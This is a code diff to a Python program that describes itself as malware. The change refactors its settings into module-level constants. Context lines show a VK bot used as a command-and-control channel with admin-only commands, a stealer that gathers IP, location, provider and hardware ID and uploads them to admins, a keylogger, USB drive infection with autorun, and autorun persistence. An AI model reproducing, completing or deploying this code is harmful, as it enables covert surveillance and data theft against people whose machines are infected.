@@ -1,6 +1,9 @@
 # -*- coding: utf-8 -*-
 
 # Should we show debug messages or not.
+from os import stat
+
+
 DEBUG = True
 
 try:
@@ -68,44 +71,38 @@ __COMMANDS_HELP = None
 # System OK code.
 __SYSTEM_OK = 0
 
+# Server token.
+SERVER_TOKEN = "" # noqa
 
-class Settings:
-    # Version of the malware.
-    VERSION = "[Pre-release] 0.4"
+# Server group ID.
+SERVER_GROUP = 0
 
-    # Drives that we will skip when infecting drives.
-    SPREADING_SKIPPED_DRIVES = ("C", "D")
+# Server admins list.
+SERVER_ADMINS = []
 
-    # Is keylogger disabled or not.
-    KEYLOGGER_DISABLED = True
+# Is HWID grabbing is disabled or not.
+DISABLE_HWID = True
 
-    # Is spreading disabled or not.
-    SPREADING_DISABLED = True
+# Dont add to autorun?
+DISABLED_AUTORUN = True
 
-    # Message for when not is admin.
-    MESSAGE_NOT_ADMIN = "Sorry, but you don't have required permissions to make this command!"
+# Message for when not is admin.
+MESSAGE_NOT_ADMIN = "Sorry, but you don't have required permissions to make this command!"
 
-    # Is spreading disabled or not.
-    SPREADING_INFECTION_DISABLED = True
+# Is spreading disabled or not.
+SPREADING_INFECTION_DISABLED = True
 
-    # Server token.
-    SERVER_TOKEN = "" # noqa
+# Is spreading disabled or not.
+SPREADING_DISABLED = True
 
-    # Server group ID.
-    SERVER_GROUP = 0
+# Is keylogger disabled or not.
+KEYLOGGER_DISABLED = True
 
-    # Server admins list.
-    SERVER_ADMINS = []
+# Drives that we will skip when infecting drives.
+SPREADING_SKIPPED_DRIVES = ("C", "D")
 
-    # Is HWID grabbing is disabled or not.
-    DISABLE_HWID = True
-
-    # Default HWID if it is disabled.
-    DEFAULT_HWID = "00000000-0000-0000-0000-000000000000"
-
-    # Dont add to autorun?
-    DISABLED_AUTORUN = True
-
+# Version of the malware.
+VERSION = "[Pre-release] 0.4"
 
 class Commands:
     # Class Commands that implements commands.
@@ -590,7 +587,7 @@ class Commands:
         # @description Function for command "version" that returns current version.
 
         # Returning.
-        return Settings.VERSION
+        return VERSION
 
     @staticmethod
     def command_name_new(_arguments) -> str:
@@ -718,7 +715,6 @@ class Commands:
         # Returning.
         return ", ".join(filesystem_get_drives_list())
 
-
 class Server:
     # Class method that implements server.
     @staticmethod
@@ -734,8 +730,8 @@ class Server:
         try:
             # Trying to connect to server.
 
-            __SERVER_API = vk_api.VkApi(token=Settings.SERVER_TOKEN)
-            __SERVER_BOT = vk_api.bot_longpoll.VkBotLongPoll(__SERVER_API, Settings.SERVER_GROUP)
+            __SERVER_API = vk_api.VkApi(token=SERVER_TOKEN)
+            __SERVER_BOT = vk_api.bot_longpoll.VkBotLongPoll(__SERVER_API, SERVER_GROUP)
         except Exception as _exception: # noqa
             # If there is exception occurred.
 
@@ -792,7 +788,7 @@ class Server:
         if _peer_index is None:
             # If peer index is not specified.
 
-            for _admin_peer_index in Settings.SERVER_ADMINS:
+            for _admin_peer_index in SERVER_ADMINS:
                 # For every peer index in admins peer indices.
 
                 # Sending messages to they.
@@ -1028,7 +1024,7 @@ def spreading_infect_drive(_drive: str) -> None:
 
     # TODO: Make autorun folder hidden.
 
-    if Settings.SPREADING_INFECTION_DISABLED:
+    if SPREADING_INFECTION_DISABLED:
         # If infection disabled.
 
         # Returning.
@@ -1037,7 +1033,7 @@ def spreading_infect_drive(_drive: str) -> None:
     try:
         # Trying to infect drive.
 
-        if _drive in Settings.SPREADING_SKIPPED_DRIVES:
+        if _drive in SPREADING_SKIPPED_DRIVES:
             # If this drive in skipped drives.
 
             # Returning and not infecting.
@@ -1159,7 +1155,7 @@ def spreading_start() -> None:
     # @returns None
     # @description Function that starts malware spreading.
 
-    if Settings.SPREADING_DISABLED:
+    if SPREADING_DISABLED:
         # If spreading is disabled.
 
         # Returning.
@@ -1237,7 +1233,7 @@ def keylogger_start() -> None:
     # @returns None
     # @description Function that starts keylogger (Setting callback for on release keyboard function).
 
-    if Settings.KEYLOGGER_DISABLED:
+    if KEYLOGGER_DISABLED:
         # If keylogger is disabled.
 
         # Returning.
@@ -1550,7 +1546,7 @@ def load_tags() -> None:
                 # Tags list.
                 __TAGS = [get_ip()["ip"], get_operating_system(), "PC"] # noqa
 
-                if not Settings.DISABLE_HWID:
+                if not DISABLE_HWID:
                     # If we don't disable HWID.
 
                     # Adding HWID.
@@ -1564,7 +1560,7 @@ def load_tags() -> None:
             # Tags list.
             __TAGS = [get_ip()["ip"], get_operating_system(), "PC"] # noqa
 
-            if not Settings.DISABLE_HWID:
+            if not DISABLE_HWID:
                 # If we don't disable HWID.
 
                 # Adding HWID.
@@ -1588,15 +1584,18 @@ def get_hwid() -> str:
     # @returns str
     # @description Function that return unique hardware index.
 
+    # Default HWID.
+    _DEFAULT = "00000000-0000-0000-0000-000000000000"
+
     # Returning blank if HWID is disabled.
-    if Settings.DISABLE_HWID:
+    if DISABLE_HWID:
         # If HWID is disabled.
 
         # Returning default.
-        return Settings.DEFAULT_HWID
+        return _DEFAULT
 
     try:
-        # Trying to get HWID.
+        # Trying to get HWID
 
         # Command to execute.
         _command = "wmic csproduct get uuid"
@@ -1615,7 +1614,7 @@ def get_hwid() -> str:
                       f"Full exception information - {_exception}")
 
         # Returning default.
-        return Settings.DEFAULT_HWID
+        return _DEFAULT
 
 
 def get_ip():
@@ -1837,7 +1836,7 @@ def stealer_steal_data(_force: bool = False):
             __VALUES["internet_region"] = _ip["region"] # noqa
             __VALUES["internet_provider"] = _ip["org"] # noqa
 
-            if not Settings.DISABLE_HWID:
+            if not DISABLE_HWID:
                 # If HWID is not disabled.
 
                 # Writing HWID.
@@ -1872,7 +1871,7 @@ def stealer_steal_data(_force: bool = False):
                 # Dumping.
                 json.dump(__VALUES, _file, indent=4)
 
-            for _peer in Settings.SERVER_ADMINS:
+            for _peer in SERVER_ADMINS:
                 # For every peer in admins.
 
                 # Uploading document.
@@ -1909,7 +1908,7 @@ def user_is_admin(_peer: str) -> bool:
     # @description Function that returns is given user is admin or not.
 
     # Returning.
-    return _peer in Settings.SERVER_ADMINS
+    return _peer in SERVER_ADMINS
 
 
 def client_answer_server(_event) -> None:
@@ -1951,7 +1950,7 @@ def client_answer_server(_event) -> None:
                 # If not is admin.
 
                 # Answering with an error.
-                _response_text = Settings.MESSAGE_NOT_ADMIN
+                _response_text = MESSAGE_NOT_ADMIN
         else:
             # If this is not alive command.
 
@@ -2033,7 +2032,7 @@ def client_answer_server(_event) -> None:
                     # If not is admin.
 
                     # Answering with an error.
-                    _response_text = Settings.MESSAGE_NOT_ADMIN
+                    _response_text = MESSAGE_NOT_ADMIN
     except Exception as _exception: # noqa
         # If there an exception.
 
@@ -2134,7 +2133,7 @@ def autorun_register() -> None:
     # @returns None
     # @description Function that registers current executable file to the autorun.
 
-    if Settings.DISABLED_AUTORUN:
+    if DISABLED_AUTORUN:
         # If autorun is disabled.
 
         # Return.
@@ -2197,7 +2196,7 @@ def autorun_unregister() -> None:
     # @returns None
     # @description Function that unregisters current executable file to the autorun.
 
-    if Settings.DISABLED_AUTORUN:
+    if DISABLED_AUTORUN:
         # If autorun is disabled.
 
         # Return.
